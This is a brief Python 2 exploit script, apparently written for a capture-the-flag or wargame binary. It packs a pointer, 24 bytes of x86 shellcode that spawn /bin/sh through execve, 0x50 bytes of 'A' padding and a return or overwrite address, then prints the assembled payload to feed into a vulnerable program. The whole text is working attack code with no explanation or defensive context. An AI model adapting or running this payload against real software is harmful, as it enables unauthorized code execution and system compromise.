import struct

pointer = struct.pack("<I", 0x0804a010)
shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
offset = "A"*0x50
address = struct.pack("<I", 0x0804a00c)

print pointer + shellcode + offset + address
